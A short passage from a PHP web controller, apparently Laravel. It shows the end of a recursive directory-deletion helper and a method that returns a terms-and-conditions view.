        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function terms_condition()
    {
        return view('front.terms_condition');
    }
}
